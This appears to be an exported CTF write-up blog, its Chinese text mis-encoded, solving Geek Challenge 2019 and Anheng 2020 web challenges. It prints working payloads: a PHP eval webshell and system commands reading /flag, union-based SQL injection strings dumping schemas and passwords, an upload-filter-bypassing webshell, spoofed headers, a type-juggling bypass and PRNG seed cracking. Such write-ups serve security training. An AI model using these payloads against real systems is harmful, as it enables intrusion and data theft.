<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-Knife"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Knife" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h1><p>åˆæ˜¯ç™½ç»™shellçš„é¢˜</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval($_POST[&quot;Syc&quot;]);</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥ç”¨èœåˆ€ç›´æ¥è¿ï¼Œç„¶åæ‰¾åˆ° <code>flag</code></p>
<p>ä¹Ÿå¯ä»¥ç›´æ¥åˆ©ç”¨ä¸€å¥è¯æœ¨é©¬ï¼Œç›´æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">Syc&#x3D;system(&quot;ls -al &#x2F;&quot;);</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhlv5gj30g40ghgnx.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhlv5gj30g40ghgnx.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åå¾—åˆ° <code>flag</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Syc&#x3D;system(&quot;cat &#x2F;flag&quot;);</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h1><p>okï¼Œç†Ÿæ‚‰çš„ç™»é™†ç•Œé¢ï¼Œå…ˆè¯•è¯•ç®€å•çš„ <code>&#39;or 1=1#</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413dc9yyj308h09s75x.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413dc9yyj308h09s75x.jpg" class="lazyload" title="test"></a></p>
<p>å›æ˜¾ç™»é™†æˆåŠŸï¼Œå¹¶ä¸”è¾“å‡ºæ•°æ®åº“ä¸­å†…å®¹</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413dchm7j30m20dy43j.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413dchm7j30m20dy43j.jpg" class="lazyload" title="test"></a></p>
<p>å°è¯•ç›²æ³¨ï¼Œå‘ç°å­˜åœ¨å•å¼•å·åŒ…è£¹ï¼Œå­—ç¬¦å‹æ³¨å…¥</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413ddn92j30vl0h4n1v.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413ddn92j30vl0h4n1v.jpg" class="lazyload" title="test"></a></p>
<p>ç”¨ <code>order by</code> è¿›è¡ŒæŸ¥è¯¢åˆ°4 æŠ¥é”™äº†<br>è¯´æ˜æœ‰ä¸‰ä¸ªå­—æ®µ</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin%27+order+by+4%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413de8vwj30fx0g477o.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413de8vwj30fx0g477o.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åç”¨è”åˆæŸ¥è¯¢æŸ¥åˆ°äº†æ•°æ®åº“</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&amp;password&#x3D;admin%27 union+select+2,3,group_concat(schema_name)+from+information_schema.schemata%23</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413ddklaj30vq0a7q5z.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413ddklaj30vq0a7q5z.jpg" class="lazyload" title="test"></a></p>
<p>æŸ¥è¯¢æ•°æ®è¡¨</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&amp;password&#x3D;admin%27+union+select+1%2C2%2Cgroup_concat(table_name)+from+information_schema.tables+where+table_schema%3Ddatabase()+%23</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413deal4j30uf0a0ad1.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413deal4j30uf0a0ad1.jpg" class="lazyload" title="test"></a></p>
<p>æŸ¥è¯¢æ•°æ®è¡¨ä¸­çš„åˆ—ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&amp;password&#x3D;admin%27%20union%20select%201%2C2%2Cgroup_concat(column_name)%20from%20information_schema.columns%20where%20table_schema%3Ddatabase()%20%23</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413diqh1j30x10cytd9.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413diqh1j30x10cytd9.jpg" class="lazyload" title="test"></a></p>
<p>GET flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;admin&amp;password&#x3D;admin&#39;%20union%20select%201%2C2%2Cgroup_concat(password)%20from%20l0ve1ysq1%23</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h1><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhmo2jj30fd06040k.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhmo2jj30fd06040k.jpg" class="lazyload" title="test"></a></p>
<p>é¢˜ç›®å¤§æ¦‚æ˜¯è¦æä¸ªå›¾ç‰‡é©¬ï¼Œå…ˆéšä¾¿è¯•è¯•è¿‡æ»¤</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhn0quj31540940vt.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhn0quj31540940vt.jpg" class="lazyload" title="test"></a></p>
<p>å›æ˜¾è¯´è¿‡æ»¤äº† <code>&lt;?</code>ï¼Œé‚£å°±å°è¯•js ç»•è¿‡</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;@<span class="keyword">eval</span>($_POST[<span class="string">'hacker'</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhkryzj30zd06rwgq.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhkryzj30zd06rwgq.jpg" class="lazyload" title="test"></a></p>
<p>å‘ç°è¿˜æœ‰wafï¼Œ å¤§æ¦‚è¿˜æœ‰æ–‡ä»¶å¤´éªŒè¯</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhnlp8j315o0a1aea.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhnlp8j315o0a1aea.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åå°è¯•ç»•è¿‡æˆªæ–­ï¼Œè¢«waf</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhpp5bj30h90560t1.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhpp5bj30h90560t1.jpg" class="lazyload" title="test"></a></p>
<p>æœ€åæ„é€ å¦‚ä¸‹Payload</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhs8usj30xh053myl.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhs8usj30xh053myl.jpg" class="lazyload" title="test"></a></p>
<p>èœåˆ€è¿ä¸€ä¸‹ <code>?hacker8.phtml</code>ï¼Œå¾—åˆ°flag</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhsnh6j30zk0jggoe.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhsnh6j30zk0jggoe.jpg" class="lazyload" title="test"></a></p>
<hr>
<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h1><p>åšäº†è¿™ä¸ªè¿™ä¹ˆå¤šé¢˜ï¼ŒæŒ‰ç…§éš¾æ˜“åº¦ï¼ŒçŒœç€å¤§æ¦‚æ˜¯ä¸ªä¼ªé€ <br>é¦–å…ˆåœ¨æºç çœ‹åˆ°äº†  <code>href=&quot;Secret.php&quot;</code><br>ç‚¹å¼€è·³è½¬åï¼Œç½‘é¡µå›æ˜¾</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">It doesn&#39;t come from &#39;https:&#x2F;&#x2F;www.Sycsecret.com&#39;</span><br></pre></td></tr></table></figure></div>

<p> Bp æ‹¦æˆªæ”¹ä¸€ä¸‹ï¼ŒåŠ ä¸ª <code>referer</code> å¤´</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">referer: https:&#x2F;&#x2F;www.Sycsecret.com</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åå¤šäº†æ–°çš„è¦æ±‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Please use &quot;Syclover&quot; browser</span><br></pre></td></tr></table></figure></div>

<p>å†æ”¹ä¸€ä¸‹ <code>User-Agent: Syclover</code></p>
<p>æ€ä¹ˆè¿™ä¹ˆå¤šäº‹å‘¢</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">No!!! you can only read this locally!!!</span><br></pre></td></tr></table></figure></div>

<p>åŠ ä¸ª <code>X-Forwarded-For: 127.0.0.1</code><br>ç„¶åæ‹¿åˆ°äº† flag</p>
<hr>
<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h1><p>è¿›å…¥ç±»ä¼¼çš„ç½‘é¡µï¼Œæºç ä¸­æ‰¾åˆ°äº† <code>href=&quot;pay.php&quot;</code><br>ç„¶åé¡µé¢å‡ºç°äº†</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div></div><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">ATTENTION</span><br><span class="line">If you want to buy the FLAG:</span><br><span class="line">You must be a student from CUIT!!!</span><br><span class="line">You must be answer the correct password!!!</span><br><span class="line"></span><br><span class="line">Only Cuit's students can buy the FLAG</span><br></pre></td></tr></table></figure></div>

<p>åœ¨æºç æ‰¾åˆ°äº†è¿™ä¸ª</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">	$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">	<span class="keyword">if</span> (is_numeric($password)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç®€å•çš„ç»•è¿‡ï¼Œç„¶åæ„é€ payload</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/pay.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: user=1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 23</span><br><span class="line"></span><br><span class="line">password=404a&amp;money[]=1</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2020å®‰æ’æ¯ä¸¨æ–°æ˜¥ç¥ˆç¦èµ›</title>
    <url>/yakko117/2020/01/28/%E5%AE%89%E6%81%922020%E6%96%B0%E6%98%A5%E8%B5%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p><a href="https://www.linkedbyx.com/" target="_blank" rel="noopener">å®‰æ’é¢˜ç›®é“¾æ¥</a></p>
<h1 id="æ¯ç‡¥çš„æŠ½å¥–"><a href="#æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="æ¯ç‡¥çš„æŠ½å¥–"></a>æ¯ç‡¥çš„æŠ½å¥–</h1><p>phpä¼ªéšæœºçˆ†ç ´</p>
<p>è¿›å…¥é¡µé¢ï¼Œå›æ˜¾è¯´çŒœå­—ç¬¦ä¸²æ¸¸æˆ(å¤§å°å†™å­—æ¯+æ•°å­—)ï¼ŒçŒœä¸­å…¨éƒ¨20ä½å¾—flagï¼Œç„¶åç»™å‡ºäº†å‰åä½ï¼ŒæŸ¥çœ‹æºç ï¼Œå‘ç°äº† <code>check.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cIbLnJQhrp</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'seed'</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'num'</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure></div>

<p>å‘ç° <code>mt_scrand()</code>ï¼Œ<code>mt_rand()</code> å‡½æ•°å’Œ <code>session</code> éƒ½æ˜¯ç”¨çš„éšæœºæ•°è®¾ç½®</p>
<p>åˆ©ç”¨<a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">çˆ†ç ´å·¥å…·</a>å’Œè„šæœ¬è·å¾—éšæœºæ•°ï¼Œè¿›è¡Œçˆ†ç ´</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'cIbLnJQhrp'</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> (res)</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2 2 0 61 44 44 0 61 1 1 0 61 47 47 0 61 13 13 0 61 45 45 0 61 52 52 0 61 7 7 0 61 17 17 0 61 15 15 0 61</span><br></pre></td></tr></table></figure></div>

<p>åˆ©ç”¨å·¥å…·çˆ†ç ´<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gbcmvrt6abj30ki0ciq4j.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gbcmvrt6abj30ki0ciq4j.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åå°†å¾—åˆ°çš„éšæœºsessionå€¼ï¼Œæ”¾äºè„šæœ¬ï¼Œå¾—åˆ°å¯†ç ï¼Œè¾“å…¥åå¾—åˆ°flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">314836512</span>);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">show_source(<span class="string">"test.php"</span>);</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="BabySqli"><a href="#BabySqli" class="headerlink" title="BabySqli"></a>BabySqli</h1><p>åˆšå­¦å®Œsqliï¼Œæˆ‘æ‰çŸ¥é“ä¸‡èƒ½å£ä»¤è¿™ä¹ˆå±é™©ï¼Œè¿˜å¥½æˆ‘è¿›è¡Œäº†é˜²æŠ¤ï¼Œè¿˜ç”¨md5å“ˆå¸Œäº†å¯†ç ï¼</p>
<p>ç‚¹å¼€é¢˜ç›®é“¾æ¥ï¼Œå°è¯•ä½¿ç”¨æ³¨å…¥</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; or &#39;1&#x3D;1&#39;#</span><br></pre></td></tr></table></figure></div>

<p>è·³è½¬é¡µé¢æç¤º <code>wrong pass</code>ï¼Œçœ‹æºä»£ç ï¼Œå‘ç°ä¸€æ®µå¥‡æ€ªçš„</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</span><br><span class="line"></span><br><span class="line">base32 è§£ç å¾—åˆ°</span><br><span class="line">c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</span><br><span class="line"></span><br><span class="line">base64 è§£ç å¾—åˆ°</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">'$name'</span></span><br></pre></td></tr></table></figure></div>

<p>ä¸€å¼€å§‹åˆ©ç”¨sqlmapè·‘å‡º3ä¸ªcolumnï¼Œ<code>id</code>ï¼Œ <code>username</code>ï¼Œ <code>password</code></p>
<p>æ³¨å‡ºå¯†ç  <code>cdc9c819c7f8be2628d4180669009d28</code> å¤§æ¦‚æ˜¯ä¸ªmd5</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;admin&#39; And 1&gt;2 union select &#39;1&#39;, &#39;2&#39;, &#39;admin&#39;,&#39;d41a28db4e476e31a13d6596200f4787&amp;pw&#x3D;yakko</span><br><span class="line"></span><br><span class="line">Error: The used SELECT statements have a different number of columns</span><br><span class="line"></span><br><span class="line">ç„¶åæ¨æ–­ åˆ†åˆ«é—® id username md5åŠ å¯†çš„password </span><br><span class="line">æäº¤payloadï¼Œå¾—åˆ°flag</span><br><span class="line">name&#x3D;admin&#39; And 1&gt;2 union select &#39;1&#39;, &#39;admin&#39;,&#39;d41a28db4e476e31a13d6596200f4787&amp;pw&#x3D;yakko</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="BabySqliv2-0"><a href="#BabySqliv2-0" class="headerlink" title="BabySqliv2.0"></a>BabySqliv2.0</h1><p>æˆ‘å¯¹ç½‘ç«™è¿›è¡Œäº†åŠ å›ºï¼Œè¿˜æ”¯æŒäº†ä¸­æ–‡è´¦å·ï¼Œè¿™ä¸‹ä½ ä»¬æ²¡è¾™äº†å§ï¼Ÿ</p>
<p><a href="http://blog.sina.com.cn/s/blog_1669853c90102xk7k.html" target="_blank" rel="noopener">phpä»£ç å®¡è®¡ä¹‹ç»•è¿‡addslashes()å‡½æ•°çš„å‡ ç§æƒ…å†µ</a><br><a href="https://blog.csdn.net/qq_39101049/article/details/88839514" target="_blank" rel="noopener">sqlåŸºäº extractvalue()ï¼Œfloor()ï¼Œupdatexml()å‡½æ•°çš„æŠ¥é”™æ³¨å…¥</a></p>
<p>å¼€å§‹åªè¦è¾“å…¥ <code>admin</code>ï¼Œéƒ½èƒ½è¿›å»ï¼Œçœ‹åˆ°å›æ˜¾</p>
